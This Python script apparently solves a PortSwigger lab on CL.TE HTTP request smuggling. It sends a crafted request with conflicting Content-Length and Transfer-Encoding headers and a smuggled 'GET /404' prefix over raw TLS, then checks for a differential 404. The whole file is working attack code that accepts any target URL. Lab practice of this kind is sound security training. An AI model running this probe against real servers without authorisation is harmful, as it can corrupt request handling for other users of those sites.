#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Confirming a CL.TE vulnerability via
differential responses.

Smuggle a GET /404 prefix with a dangling X-Ignore header. The back-end
parks it after the chunked terminator; the next request's bytes get
absorbed into the X-Ignore value, producing a 404 response on the second
send.

Raw TLS sockets because requests normalizes conflicting length headers.
"""

import argparse
import socket
import ssl
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 35\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /404 HTTP/1.1\r\n"
    "X-Ignore: X"
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 4 (CL.TE differential response)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    smuggled_body = (
        "0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X"
    )
    assert len(smuggled_body.encode()) == 35, (
        f"Body must be exactly 35 bytes; got {len(smuggled_body.encode())}"
    )

    print(f"[*] Sending CL.TE differential-response probe twice to {host}:{port}")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
        print(f"\n[+] Response {i} status: {status}")

    if b" 404 " in responses[-1][:20]:
        print("\n[+] Differential 404 observed on second response — smuggling confirmed.")
    else:
        print("\n[-] Second response wasn't 404 — probe may have been corrected or the stack isn't CL.TE.")


if __name__ == "__main__":
    main()
